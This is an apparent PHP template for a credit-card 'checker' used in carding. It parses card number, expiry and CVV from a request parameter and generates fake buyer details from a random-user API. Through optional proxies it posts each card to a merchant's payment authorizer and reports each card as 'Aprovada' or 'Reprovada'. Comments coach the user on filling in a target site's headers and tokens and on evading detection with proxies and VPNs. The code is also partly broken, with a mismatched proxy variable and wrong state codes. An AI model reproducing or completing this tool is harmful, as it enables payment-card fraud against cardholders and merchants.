<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires'); #<<-- Set whatever timezone you fit on -->

//You'll see some Portuguese response as I used brazilian named variables(Easier to append) ;]
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function bishesproxys() 
{
  //$poxySocks = file("proxy.txt"); <--Nahh You Need no Proxies unless the site has some sort of Capcha but if you want to use em just uncomment this part and add a text file in the home directory named proxy.txt-->
  $myproxy = rand(0, sizeof($poxySocks) - 1); // For proxy listing on decrement order
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = bishesproxys();  // Proxy function definition to be used later


$lista = $_GET['lista'];  //Abstract the various parameters listing
$enum_1 = multiexplode(array(":", "|", ""), $lista)[0];
$enum_2 = multiexplode(array(":", "|", ""), $lista)[1];
$enum_3 = multiexplode(array(":", "|", ""), $lista)[2];
$enum_4 = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}

////////////////////////////===[Random Details API]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us'); // <<--I suggest using native country as US with a VPN for the best ping response-->
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


// You can either use fakenamegenerator or randomuser api for randomizing the address vectors..But i added individual ones referring to USA cuz Why Not !!
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}

/////////========Proxies or IP lister --  <<-- This Part is for Any sort of Backconnecting or Residential Proxies..If you have one that is !!  They are hella expensive -->>
/*
$proxies = array();
$proxies [] = '207.229.93.68:1025'; //Some proxies require IP,port no...This part needs to be uncommented to use the token3..It's named token3 , why not token 1 or 2 ? --> Because I want to & need to boii !! =  As req-2 or req-3 sites require multiple CSRF tokens
$proxies [] = '207.229.93.68:1026';
$proxies [] = '207.229.93.68:1027';
$proxies [] = '207.229.93.68:1028';
$proxies [] = '207.229.93.68:1029';*/
///if (isset($proxies)) {
    ///$proxy = $proxies[array_rand($proxies)];
///}


////////////////////////////===[For Auth Response]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, ''); //Site's original payment authorizer .. This may differ from site to site ..mostly same for req-1 based sites
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "proxyusername:proxypassword"); <<-- Proxy Authentication Format (Username : Password) -->>
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'authority: ',         //This part represents the site authorization remainder
  'accept: ',            //Parameters that the target site api accepts
  'accept-encoding: ',   //Encoding that the target site api accepts
  'accept-language: ',   //Language that the target site api accepts
  'content-type: ',      //Parameters that the target site accepts
  'origin: ',            //It's always the site's primary domain
  'referer: ',           //This is very important part that initializes the api access 
  'sec-fetch-dest: ',    //Use ur goddamn brains
  'sec-fetch-mode: ',    //Use ur goddamn brains
  'sec-fetch-site: '     //Use ur goddamn brains
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '

	');    // POSTFIELD is the second most important part for the API.. Make sure that you use the appropriate variables and  refer them inside the single quotation like such '.$bishesvar.'


$result = curl_exec($ch);
$token3 = trim(strip_tags(getStr($result,'"client_ip": "','"')));  #This part is for displaying your IP..You can comment it out if you don't need IP display or don't use proxies !!

#<<-------  If you are testing on a site that's giving out responses on multiple hierarchies ..just replicate this part from curl init to the postfields and entry down the different variable parts ---------->>

echo "<font class='badge badge-secondary'> Bishes☢⚠☣ </font>";





//          <<------------------------------Server Auth or Charge Response------------------------>>

if(strpos($result, 'Transaction Succeded')){

  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada OWASP❌ <i class='zmdi zmdi-check'></i></font> $enum_1|$enum_2|$enum_3|$enum_4 <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: RESPECT bitch !]</i></font><br>";
  }
else {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada OWASP❌ <i class='zmdi zmdi-close'></i></font> $enum_1|$enum_2|$enum_3|$enum_4 <font size=5 color='red'><font class='badge badge-danger'>Error Code : $result</i></font><br>";
}

curl_close($ch);
//echo $result;        Just uncomment this command to view detailed server response
ob_flush();              //Clean Dem OB Cache ..Saves memory !!
?>
